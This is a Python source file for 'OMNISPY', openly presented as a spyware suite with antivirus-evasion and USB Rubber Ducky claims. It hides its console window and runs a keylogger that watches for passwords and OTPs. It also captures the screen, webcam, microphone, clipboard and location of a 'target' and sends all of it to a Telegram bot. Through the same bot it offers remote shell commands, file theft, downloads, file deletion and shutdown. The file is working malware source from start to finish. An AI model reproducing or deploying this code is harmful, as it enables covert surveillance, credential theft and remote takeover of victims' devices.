# ============================================================
# OMNISPY – Ultimate Spyware Suite
# Full-Featured Spyware with Telegram Bot + Web Dashboard
# Support: Windows, Linux, Mac, PROOT (Termux/Android)
# USB Rubber Ducky Ready – Anti Deteksi AV
# ============================================================

import os
import sys
import time
import json
import subprocess
import threading
import requests
import ctypes
import shutil
from datetime import datetime
from PIL import ImageGrab
import cv2
import numpy as np
import pyaudio
import wave
import telebot
import schedule
import sqlite3
import hashlib
import base64
from flask import Flask, render_template, request, jsonify, session, send_file
from flask_socketio import SocketIO, emit

# ===== HIDE CONSOLE (WINDOWS) =====
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

# ============================================================
# 🔥 WARNA TERMINAL
# ============================================================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    # ===== SHADOW 3D OMNISPY =====
    print(f"""{RED}
    ██████   ███    ███  ███    ██  ██▓ ██████  ██████  ██    ██ 
  ██    ██  ████  ████  ████   ██  ▓██▒██   █▒██   █ ██    ██ 
  ██    ██  ██ ████ ██  ██ ██  ██  ██ ██████▒██████  ██    ██ 
  ██    ██  ██  ██  ██  ██  ██ ██  ██ ██   █ ██   █  ██    ██ 
   ██████   ██      ██  ██   ████  ██ ██████  ██████   ██████  
{RESET}""")
    print(f"{GREEN}[+] System Initializing...{RESET}")
    print(f"{GREEN}[+] USB Rubber Ducky Mode: ACTIVE{RESET}")
    print(f"{GREEN}[+] Loading Modules...{RESET}")
    time.sleep(1)
    print(f"{GREEN}[+] Connecting to Telegram Bot...{RESET}")
    time.sleep(0.5)
    print(f"{GREEN}[+] Starting Web Dashboard...{RESET}")
    time.sleep(0.5)
    print(f"{GREEN}[+] All Systems Ready!{RESET}")
    print(f"{CYAN}─────────────────────────────────────────────────{RESET}")
    print(f"{YELLOW}📌 Status: {GREEN}ACTIVE{RESET}")
    print(f"{YELLOW}🌐 Dashboard: {CYAN}http://localhost:5000{RESET}")
    print(f"{YELLOW}🤖 Telegram: {CYAN}Bot Connected{RESET}")
    print(f"{YELLOW}💾 USB Mode: {GREEN}Rubber Ducky Ready{RESET}")
    print(f"{CYAN}─────────────────────────────────────────────────{RESET}\n")

banner()

# ============================================================
# 🔥 KONFIGURASI — GANTI DENGAN PUNYA LO
# ============================================================
BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # GANTI
CHAT_ID = "123456789"  # GANTI
ADMIN_PASSWORD = hashlib.sha256("admin123".encode()).hexdigest()

# ============================================================
# FLASK APP (Web Dashboard)
# ============================================================
app = Flask(__name__)
app.secret_key = "supersecretkey_omnispy_2025"
socketio = SocketIO(app, cors_allowed_origins="*")

# ============================================================
# TELEGRAM BOT
# ============================================================
bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
# DATABASE SQLITE
# ============================================================
def init_db():
    conn = sqlite3.connect('omnispy_logs.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT,
                  type TEXT,
                  message TEXT,
                  timestamp TEXT,
                  data TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT UNIQUE,
                  name TEXT,
                  last_seen TEXT)''')
    conn.commit()
    conn.close()

def save_log(device_id, type, message, data=""):
    conn = sqlite3.connect('omnispy_logs.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("INSERT INTO logs (device_id, type, message, timestamp, data) VALUES (?,?,?,?,?)",
              (device_id, type, message, timestamp, data))
    conn.commit()
    conn.close()
    socketio.emit('new_log', {
        'device_id': device_id,
        'type': type,
        'message': message,
        'timestamp': timestamp,
        'data': data
    })

def get_logs(device_id=None, limit=100):
    conn = sqlite3.connect('omnispy_logs.db')
    c = conn.cursor()
    if device_id:
        c.execute("SELECT * FROM logs WHERE device_id=? ORDER BY id DESC LIMIT ?", (device_id, limit))
    else:
        c.execute("SELECT * FROM logs ORDER BY id DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    logs = []
    for row in rows:
        logs.append({
            'id': row[0],
            'device_id': row[1],
            'type': row[2],
            'message': row[3],
            'timestamp': row[4],
            'data': row[5]
        })
    return logs

def register_device(device_id, name=""):
    conn = sqlite3.connect('omnispy_logs.db')
    c = conn.cursor()
    try:
        c.execute("INSERT INTO devices (device_id, name, last_seen) VALUES (?,?,?)",
                  (device_id, name, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    except:
        c.execute("UPDATE devices SET last_seen=? WHERE device_id=?", 
                  (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), device_id))
    conn.commit()
    conn.close()

def get_devices():
    conn = sqlite3.connect('omnispy_logs.db')
    c = conn.cursor()
    c.execute("SELECT * FROM devices ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    devices = []
    for row in rows:
        devices.append({
            'id': row[0],
            'device_id': row[1],
            'name': row[2],
            'last_seen': row[3]
        })
    return devices

init_db()
device_id = "target_001"
register_device(device_id, "Target Device")

# ============================================================
# VARIABEL GLOBAL
# ============================================================
keylog_data = ""
keylog_running = False
recording_screen = False
recording_mic = False
audio_frames = []
camera = None
last_lat, last_lon = 0.0, 0.0
screenshot_interval = 300
sensitive_words = ["password", "login", "admin", "username", "email", "credit", "card", "pin", "otp", "rahasia", "kunci"]
geofence_center_lat = -6.2
geofence_center_lon = 106.8
geofence_radius_km = 10
screen_streaming = False
screen_frame = None
clipboard_data = ""
mic_alert_threshold = 1000

# ============================================================
# FITUR 1: NOTIFIKASI PUSH KE HP
# ============================================================
def send_notification(message):
    try:
        bot.send_message(CHAT_ID, f"🔔 NOTIFIKASI [{device_id}]: {message}")
        save_log(device_id, 'notification', message)
    except:
        pass

def send_message(text):
    try:
        bot.send_message(CHAT_ID, text[:4000])
    except:
        pass

def send_photo(file_path):
    try:
        bot.send_photo(CHAT_ID, open(file_path, "rb"))
        save_log(device_id, 'screenshot', 'Screenshot dikirim')
    except:
        pass

def send_video(file_path):
    try:
        bot.send_video(CHAT_ID, open(file_path, "rb"))
        save_log(device_id, 'video', 'Video dikirim')
    except:
        pass

def send_file(file_path):
    try:
        bot.send_document(CHAT_ID, open(file_path, "rb"))
        save_log(device_id, 'file', f'File dikirim: {file_path}')
    except:
        pass

def send_audio(file_path):
    try:
        bot.send_audio(CHAT_ID, open(file_path, "rb"))
        save_log(device_id, 'audio', 'Audio dikirim')
    except:
        pass

def send_location(lat, lon):
    try:
        bot.send_location(CHAT_ID, lat, lon)
        save_log(device_id, 'gps', f'Lokasi: {lat}, {lon}')
    except:
        pass

# ============================================================
# FITUR 2: REMOTE SCREEN SHARE (LIVE STREAMING)
# ============================================================
def start_screen_stream():
    global screen_streaming, screen_frame
    screen_streaming = True
    send_notification("Screen streaming dimulai")
    while screen_streaming:
        try:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
            screen_frame = base64.b64encode(buffer).decode('utf-8')
            socketio.emit('screen_frame', {'frame': screen_frame})
            time.sleep(0.5)
        except:
            time.sleep(1)

def stop_screen_stream():
    global screen_streaming
    screen_streaming = False
    send_notification("Screen streaming dihentikan")

# ============================================================
# FITUR 3: FILE EXPLORER
# ============================================================
def list_directory(path):
    try:
        files = os.listdir(path)
        result = f"📁 Direktori: {path}\n\n"
        for item in files[:20]:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                result += f"📂 {item}/\n"
            else:
                size = os.path.getsize(full_path)
                result += f"📄 {item} ({size} bytes)\n"
        return result
    except Exception as e:
        return f"❌ Error: {str(e)}"

def delete_file(path):
    try:
        if os.path.isfile(path):
            os.remove(path)
            return f"✅ File {path} berhasil dihapus!"
        elif os.path.isdir(path):
            os.rmdir(path)
            return f"✅ Direktori {path} berhasil dihapus!"
        else:
            return "❌ Path tidak ditemukan"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================================
# FITUR 4: GEOFENCING
# ============================================================
def get_gps():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        return geo.get('lat', 0), geo.get('lon', 0)
    except:
        return 0.0, 0.0

def check_geofence(lat, lon):
    if lat == 0 or lon == 0:
        return
    distance = ((lat - geofence_center_lat)**2 + (lon - geofence_center_lon)**2)**0.5 * 111
    if distance > geofence_radius_km:
        send_notification(f"⚠️ Target keluar dari geofence! Jarak: {distance:.2f} km")
        save_log(device_id, 'geofence', f'Keluar area, jarak: {distance:.2f} km')

# ============================================================
# FITUR 5: SCREENSHOT SCHEDULE
# ============================================================
def scheduled_screenshot():
    send_notification("📸 Screenshot jadwal otomatis")
    screenshot()
    save_log(device_id, 'schedule', 'Screenshot otomatis diambil')

def start_scheduler():
    schedule.every(30).minutes.do(scheduled_screenshot)
    while True:
        schedule.run_pending()
        time.sleep(1)

# ============================================================
# FITUR 6: KEYLOGGER WITH TIMESTAMP
# ============================================================
def on_press(key):
    global keylog_data
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        char = str(key.char)
        keylog_data += f"[{timestamp}] {char}\n"
    except AttributeError:
        if key == key.space:
            keylog_data += f"[{timestamp}] [SPACE]\n"
        elif key == key.enter:
            keylog_data += f"[{timestamp}] [ENTER]\n"
        else:
            keylog_data += f"[{timestamp}] [{str(key)}]\n"
    
    for word in sensitive_words:
        if word in keylog_data.lower():
            send_notification(f"⚠️ Kata sensitif terdeteksi: '{word}'")
            save_log(device_id, 'sensitive', f'Kata sensitif: {word}')
            break

def start_keylog():
    global keylog_running, keylog_data
    keylog_running = True
    keylog_data = ""
    send_notification("⌨️ Keylogger dimulai")
    from pynput import keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        while keylog_running:
            time.sleep(1)
        listener.stop()

def stop_keylog():
    global keylog_running
    keylog_running = False
    send_notification("⌨️ Keylogger dihentikan")

# ============================================================
# FITUR 7: WEBCAM CAPTURE ON MOTION
# ============================================================
def detect_motion():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            send_notification("❌ Kamera tidak terdeteksi")
            return
        ret, frame1 = cap.read()
        if not ret:
            cap.release()
            return
        ret, frame2 = cap.read()
        if not ret:
            cap.release()
            return
        motion_detected = False
        while True:
            ret, frame2 = cap.read()
            if not ret:
                break
            diff = cv2.absdiff(frame1, frame2)
            gray = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
            blur = cv2.GaussianBlur(gray, (5, 5), 0)
            _, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)
            contours, _ = cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)
            for contour in contours:
                if cv2.contourArea(contour) > 5000:
                    if not motion_detected:
                        motion_detected = True
                        send_notification("📷 Gerakan terdeteksi di kamera!")
                        capture_photo()
                        save_log(device_id, 'motion', 'Gerakan kamera terdeteksi')
                    break
            frame1 = frame2
            time.sleep(2)
            motion_detected = False
        cap.release()
    except Exception as e:
        send_notification(f"❌ Error motion detection: {str(e)}")

# ============================================================
# FITUR 8: AUTO-SYNC KE CLOUD (SIMULASI)
# ============================================================
def sync_to_cloud(file_path):
    try:
        send_notification(f"☁️ Sync ke cloud: {file_path}")
        save_log(device_id, 'cloud', f'Sync: {file_path}')
    except Exception as e:
        send_notification(f"❌ Error sync cloud: {str(e)}")

# ============================================================
# FITUR 9: MULTI-TARGET SUPPORT
# ============================================================
def switch_target(new_device_id):
    global device_id
    device_id = new_device_id
    register_device(device_id, f"Target {new_device_id}")
    send_notification(f"🔄 Berpindah ke target: {device_id}")

# ============================================================
# FITUR 10: 2FA / PASSWORD PROTECTION
# ============================================================
def check_auth(password):
    return hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASSWORD

# ============================================================
# FITUR 11: CLIPBOARD MONITORING
# ============================================================
def monitor_clipboard():
    global clipboard_data
    try:
        import pyperclip
        while True:
            current = pyperclip.paste()
            if current != clipboard_data and current != "":
                clipboard_data = current
                send_notification(f"📋 Clipboard: {current[:100]}")
                save_log(device_id, 'clipboard', f'Clipboard: {current[:100]}')
            time.sleep(2)
    except:
        pass

# ============================================================
# FITUR 12: MIC ALERT (SUARA KERAS)
# ============================================================
def detect_loud_noise():
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        import audioop
        while True:
            data = stream.read(1024)
            rms = audioop.rms(data, 2)
            if rms > mic_alert_threshold:
                send_notification("🔊 Suara keras terdeteksi!")
                save_log(device_id, 'loud_noise', f'RMS: {rms}')
            time.sleep(1)
    except:
        pass

# ============================================================
# FITUR 13: WIFI SCANNER
# ============================================================
def scan_wifi():
    try:
        if os.name == 'nt':
            output = subprocess.check_output("netsh wlan show networks", shell=True, text=True)
        else:
            output = subprocess.check_output("nmcli dev wifi list", shell=True, text=True)
        return output[:3000]
    except:
        return "❌ Gagal scan WiFi"

# ============================================================
# FITUR 14: BATTERY MONITOR
# ============================================================
def get_battery():
    try:
        if os.name == 'nt':
            import psutil
            battery = psutil.sensors_battery()
            if battery:
                return f"{battery.percent}%"
        return "N/A"
    except:
        return "N/A"

# ============================================================
# FITUR 15: APP USAGE TRACKER
# ============================================================
def track_app_usage():
    try:
        import psutil
        while True:
            apps = []
            for proc in psutil.process_iter(['name']):
                apps.append(proc.info['name'])
            send_notification(f"📱 Apps running: {', '.join(apps[:5])}")
            save_log(device_id, 'app_usage', f'Apps: {", ".join(apps[:5])}')
            time.sleep(60)
    except:
        pass

# ============================================================
# FITUR 16: REMOTE SHUTDOWN
# ============================================================
def remote_shutdown():
    send_notification("🛑 Mematikan sistem...")
    if os.name == 'nt':
        os.system("shutdown /s /t 5")
    else:
        os.system("shutdown -h now")

# ============================================================
# FITUR 17: WEBSITE BLOCKER
# ============================================================
def block_website(url):
    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if os.name == 'nt' else "/etc/hosts"
        with open(hosts_path, 'a') as f:
            f.write(f"\n127.0.0.1 {url}")
        send_notification(f"🚫 Website diblokir: {url}")
    except:
        send_notification("❌ Gagal blokir website")

# ============================================================
# FITUR 18: FAKE ALERT
# ============================================================
def fake_alert():
    send_notification("⚠️ [FAKE] Target mengetik: 'saya tau lo ngintip'")

# ============================================================
# FITUR 19: SMS SENDER (SIMULASI)
# ============================================================
def send_sms(number, message):
    send_notification(f"📱 SMS ke {number}: {message}")
    save_log(device_id, 'sms', f'To: {number}, Message: {message}')

# ============================================================
# FITUR 20: CALL LOGGER (SIMULASI)
# ============================================================
def get_call_log():
    send_notification("📞 Call log diambil (simulasi)")
    save_log(device_id, 'call_log', 'Call log simulated')

# ============================================================
# FUNGSI UTAMA (SCREENSHOT, RECORDER, MIC, KAMERA, DLL)
# ============================================================
def screenshot():
    try:
        img = ImageGrab.grab()
        filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        img.save(filename)
        send_photo(filename)
        sync_to_cloud(filename)
        os.remove(filename)
        return True
    except Exception as e:
        send_message(f"❌ Screenshot gagal: {e}")
        return False

def start_screen_recording(duration=10, fps=10):
    global recording_screen
    try:
        recording_screen = True
        send_notification(f"🎥 Screen recording {duration} detik dimulai")
        screen_size = ImageGrab.grab().size
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"screenrec_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        out = cv2.VideoWriter(filename, fourcc, fps, screen_size)
        start_time = time.time()
        while recording_screen and (time.time() - start_time) < duration:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            time.sleep(1.0 / fps)
        out.release()
        recording_screen = False
        if os.path.exists(filename):
            send_video(filename)
            sync_to_cloud(filename)
            os.remove(filename)
        send_message(f"✅ Screen recording {duration} detik selesai!")
        save_log(device_id, 'screenrec', f'Durasi: {duration} detik')
    except Exception as e:
        send_message(f"❌ Screen recorder gagal: {e}")

def start_mic_recording(duration=10):
    global recording_mic, audio_frames
    try:
        recording_mic = True
        send_notification(f"🎙️ Rekam mic {duration} detik dimulai")
        audio_frames = []
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        start_time = time.time()
        while recording_mic and (time.time() - start_time) < duration:
            data = stream.read(CHUNK)
            audio_frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        recording_mic = False
        filename = f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(audio_frames))
        wf.close()
        if os.path.exists(filename):
            send_audio(filename)
            sync_to_cloud(filename)
            os.remove(filename)
        send_message(f"✅ Rekaman mic {duration} detik selesai!")
        save_log(device_id, 'mic', f'Durasi: {duration} detik')
    except Exception as e:
        send_message(f"❌ Rekam mic gagal: {e}")

def capture_photo():
    global camera
    try:
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            filename = f"cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            cv2.imwrite(filename, frame)
            send_photo(filename)
            sync_to_cloud(filename)
            os.remove(filename)
            send_message("✅ Foto kamera berhasil!")
            save_log(device_id, 'camera', 'Foto diambil')
        else:
            send_message("❌ Gagal mengakses kamera")
        camera.release()
    except Exception as e:
        send_message(f"❌ Kamera gagal: {e}")

def capture_video(duration=10):
    global camera
    try:
        camera = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"cam_vid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = camera.read()
            if ret:
                out.write(frame)
        camera.release()
        out.release()
        if os.path.exists(filename):
            send_video(filename)
            sync_to_cloud(filename)
            os.remove(filename)
        send_message(f"✅ Video kamera {duration} detik selesai!")
        save_log(device_id, 'camera_video', f'Durasi: {duration} detik')
    except Exception as e:
        send_message(f"❌ Video kamera gagal: {e}")

def send_gps():
    lat, lon = get_gps()
    if lat != 0 or lon != 0:
        send_location(lat, lon)
        check_geofence(lat, lon)
        send_message(f"📍 Lokasi: Lat {lat}, Lon {lon}")
        save_log(device_id, 'gps', f'Lat: {lat}, Lon: {lon}')
    else:
        send_message("❌ Gagal mendapatkan lokasi")
    return lat, lon

def execute_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
        save_log(device_id, 'cmd', f'Perintah: {cmd}')
        return output
    except subprocess.TimeoutExpired:
        return "⏱️ Perintah timeout (30 detik)"
    except Exception as e:
        return str(e)

def upload_file(path):
    if os.path.exists(path):
        try:
            send_file(path)
            sync_to_cloud(path)
            send_message(f"✅ File {path} berhasil diupload!")
            save_log(device_id, 'upload', f'File: {path}')
        except Exception as e:
            send_message(f"❌ Upload gagal: {e}")
    else:
        send_message(f"❌ File tidak ditemukan: {path}")

def download_file(url, save_path):
    try:
        r = requests.get(url, stream=True, timeout=30)
        with open(save_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        send_message(f"✅ File downloaded ke {save_path}")
        save_log(device_id, 'download', f'URL: {url} -> {save_path}')
    except Exception as e:
        send_message(f"❌ Download gagal: {e}")

# ============================================================
# USB RUBBER DUCKY – AUTO RUN DARI FLASHDISK
# ============================================================
def usb_rubber_ducky():
    """Cek apakah dijalankan dari flashdisk dan jalankan auto"""
    try:
        if os.name == 'nt':
            import win32file
            drives = []
            for drive in range(ord('A'), ord('Z') + 1):
                drive_letter = chr(drive) + ":\\"
                if os.path.exists(drive_letter):
                    drive_type = win32file.GetDriveType(drive_letter)
                    if drive_type == win32file.DRIVE_REMOVABLE:
                        drives.append(drive_letter)
            if drives:
                current_path = os.path.dirname(os.path.abspath(__file__))
                for d in drives:
                    if d in current_path:
                        send_notification("💾 Dijalankan dari USB Flashdisk (Rubber Ducky Mode)")
                        return True
    except:
        pass
    return False

# ============================================================
# WEB DASHBOARD ROUTES (Flask)
# ============================================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password')
        if check_auth(password):
            session['logged_in'] = True
            return jsonify({'status': 'success'})
        return jsonify({'status': 'failed'}), 401
    return render_template('login.html')

@app.route('/api/logs')
def api_logs():
    device_id = request.args.get('device_id')
    limit = request.args.get('limit', 100, type=int)
    return jsonify(get_logs(device_id, limit))

@app.route('/api/stats')
def api_stats():
    conn = sqlite3.connect('omnispy_logs.db')
    c = conn.cursor()
    stats = {}
    types = ['screenshot', 'keylog', 'gps', 'file', 'telegram', 'notification', 'geofence', 'camera', 'mic', 'screenrec', 'clipboard', 'loud_noise']
    for t in types:
        c.execute("SELECT COUNT(*) FROM logs WHERE type=?", (t,))
        stats[t] = c.fetchone()[0]
    conn.close()
    return jsonify(stats)

@app.route('/api/devices')
def api_devices():
    return jsonify(get_devices())

@app.route('/api/stream/frame')
def get_frame():
    global screen_frame
    if screen_frame is None:
        return jsonify({'error': 'No frame'}), 404
    return jsonify({'frame': screen_frame})

@app.route('/api/stream/start')
def start_stream_api():
    global stream_thread
    if 'stream_thread' not in globals() or not stream_thread.is_alive():
        stream_thread = threading.Thread(target=start_screen_stream, daemon=True)
        stream_thread.start()
        return jsonify({'status': 'streaming started'})
    return jsonify({'status': 'already running'})

@app.route('/api/stream/stop')
def stop_stream_api():
    stop_screen_stream()
    return jsonify({'status': 'streaming stopped'})

@app.route('/api/listdir')
def api_listdir():
    path = request.args.get('path', '/')
    try:
        items = []
        for item in os.listdir(path):
            full_path = os.path.join(path, item)
            items.append({
                'name': item,
                'is_dir': os.path.isdir(full_path),
                'size': os.path.getsize(full_path) if os.path.isfile(full_path) else 0
            })
        return jsonify({'path': path, 'items': items})
    except:
        return jsonify({'error': 'Access denied'}), 403

@app.route('/api/delete', methods=['POST'])
def api_delete():
    path = request.json.get('path')
    try:
        if os.path.isfile(path):
            os.remove(path)
        elif os.path.isdir(path):
            os.rmdir(path)
        return jsonify({'status': 'deleted'})
    except:
        return jsonify({'error': 'Delete failed'}), 500

# ============================================================
# TELEGRAM COMMANDS
# ============================================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message,
        "🕵️ OMNISPY Active!\n\n"
        "📌 DAFTAR PERINTAH:\n"
        "/screenshot - Ambil layar\n"
        "/screenrec [detik] - Rekam layar\n"
        "/keylog_start - Mulai keylogger\n"
        "/keylog_stop - Hentikan & kirim hasil\n"
        "/mic [detik] - Rekam mic\n"
        "/cam_photo - Foto dari kamera\n"
        "/cam_video [detik] - Video dari kamera\n"
        "/gps - Kirim lokasi\n"
        "/cmd [perintah] - Jalankan perintah\n"
        "/upload [path] - Upload file\n"
        "/download [url] [path] - Download file\n"
        "/status - Cek status\n"
        "/listdir [path] - List file\n"
        "/delete [path] - Hapus file\n"
        "/stream_start - Mulai screen streaming\n"
        "/stream_stop - Hentikan screen streaming\n"
        "/wifi - Scan WiFi\n"
        "/battery - Cek baterai\n"
        "/shutdown - Matikan sistem\n"
        "/block [url] - Blokir website\n"
        "/sms [nomor] [pesan] - Kirim SMS (simulasi)\n"
        "/calllog - Ambil call log (simulasi)"
    )

@bot.message_handler(commands=['screenshot'])
def handle_screenshot(message):
    bot.reply_to(message, "📸 Mengambil screenshot...")
    screenshot()

@bot.message_handler(commands=['screenrec'])
def handle_screenrec(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎥 Rekam layar {duration} detik...")
    threading.Thread(target=start_screen_recording, args=(duration, 10)).start()

@bot.message_handler(commands=['keylog_start'])
def handle_keylog_start(message):
    global keylog_thread
    if 'keylog_thread' not in globals() or not keylog_thread.is_alive():
        keylog_thread = threading.Thread(target=start_keylog)
        keylog_thread.daemon = True
        keylog_thread.start()
        bot.reply_to(message, "⌨️ Keylogger started!")
    else:
        bot.reply_to(message, "⚠️ Keylogger sudah berjalan!")

@bot.message_handler(commands=['keylog_stop'])
def handle_keylog_stop(message):
    global keylog_data
    stop_keylog()
    time.sleep(1)
    if keylog_data:
        bot.reply_to(message, f"✅ Keylog result:\n{keylog_data[:3000]}")
    else:
        bot.reply_to(message, "✅ Keylogger stopped, tidak ada data.")
    keylog_data = ""

@bot.message_handler(commands=['mic'])
def handle_mic(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎙️ Rekam mic {duration} detik...")
    threading.Thread(target=start_mic_recording, args=(duration,)).start()

@bot.message_handler(commands=['cam_photo'])
def handle_cam_photo(message):
    bot.reply_to(message, "📷 Mengambil foto dari kamera...")
    threading.Thread(target=capture_photo).start()

@bot.message_handler(commands=['cam_video'])
def handle_cam_video(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎥 Rekam video {duration} detik...")
    threading.Thread(target=capture_video, args=(duration,)).start()

@bot.message_handler(commands=['gps'])
def handle_gps(message):
    bot.reply_to(message, "📍 Mengambil lokasi...")
    threading.Thread(target=send_gps).start()

@bot.message_handler(commands=['cmd'])
def handle_cmd(message):
    cmd = message.text.replace('/cmd ', '')
    if not cmd:
        bot.reply_to(message, "❌ Masukkan perintah!")
        return
    bot.reply_to(message, f"📟 Menjalankan: {cmd}")
    output = execute_cmd(cmd)
    bot.reply_to(message, f"📟 Output:\n{output[:3900]}")

@bot.message_handler(commands=['upload'])
def handle_upload(message):
    path = message.text.replace('/upload ', '').strip()
    if not path:
        bot.reply_to(message, "❌ Masukkan path file!")
        return
    bot.reply_to(message, f"📤 Uploading {path}...")
    threading.Thread(target=upload_file, args=(path,)).start()

@bot.message_handler(commands=['download'])
def handle_download(message):
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "❌ Format: /download [url] [save_path]")
        return
    url = parts[1]
    save_path = parts[2]
    bot.reply_to(message, f"📥 Downloading dari {url} ke {save_path}...")
    threading.Thread(target=download_file, args=(url, save_path)).start()

@bot.message_handler(commands=['status'])
def handle_status(message):
    status = "🕵️ OMNISPY Active!\n\n"
    status += f"📱 OS: {os.name}\n"
    status += f"🕐 Uptime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    status += f"🔐 Keylogger: {'Running' if keylog_running else 'Stopped'}\n"
    status += f"🎥 Screen Rec: {'Running' if recording_screen else 'Stopped'}\n"
    status += f"🎙️ Mic Rec: {'Running' if recording_mic else 'Stopped'}\n"
    status += f"📸 Auto Screenshot: {screenshot_interval} detik\n"
    status += f"🆔 Device ID: {device_id}\n"
    status += f"📡 Stream: {'Running' if screen_streaming else 'Stopped'}\n"
    status += f"🔋 Baterai: {get_battery()}\n"
    bot.reply_to(message, status)

@bot.message_handler(commands=['listdir'])
def handle_listdir(message):
    path = message.text.replace('/listdir ', '').strip()
    if not path:
        path = "/"
    result = list_directory(path)
    bot.reply_to(message, result[:3900])

@bot.message_handler(commands=['delete'])
def handle_delete(message):
    path = message.text.replace('/delete ', '').strip()
    if not path:
        bot.reply_to(message, "❌ Masukkan path file/direktori!")
        return
    result = delete_file(path)
    bot.reply_to(message, result)

@bot.message_handler(commands=['stream_start'])
def handle_stream_start(message):
    global stream_thread
    if 'stream_thread' not in globals() or not stream_thread.is_alive():
        stream_thread = threading.Thread(target=start_screen_stream)
        stream_thread.daemon = True
        stream_thread.start()
        bot.reply_to(message, "📺 Screen streaming dimulai! (2 fps)")
    else:
        bot.reply_to(message, "⚠️ Streaming sudah berjalan!")

@bot.message_handler(commands=['stream_stop'])
def handle_stream_stop(message):
    stop_screen_stream()
    bot.reply_to(message, "📺 Screen streaming dihentikan!")

@bot.message_handler(commands=['wifi'])
def handle_wifi(message):
    result = scan_wifi()
    bot.reply_to(message, f"📶 WiFi Scan:\n{result[:3900]}")

@bot.message_handler(commands=['battery'])
def handle_battery(message):
    bat = get_battery()
    bot.reply_to(message, f"🔋 Baterai: {bat}")

@bot.message_handler(commands=['shutdown'])
def handle_shutdown(message):
    bot.reply_to(message, "🛑 Mematikan sistem dalam 5 detik...")
    threading.Thread(target=remote_shutdown).start()

@bot.message_handler(commands=['block'])
def handle_block(message):
    url = message.text.replace('/block ', '').strip()
    if not url:
        bot.reply_to(message, "❌ Masukkan URL!")
        return
    threading.Thread(target=block_website, args=(url,)).start()
    bot.reply_to(message, f"🚫 Website {url} diblokir!")

@bot.message_handler(commands=['sms'])
def handle_sms(message):
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "❌ Format: /sms [nomor] [pesan]")
        return
    number = parts[1]
    msg = parts[2]
    threading.Thread(target=send_sms, args=(number, msg)).start()
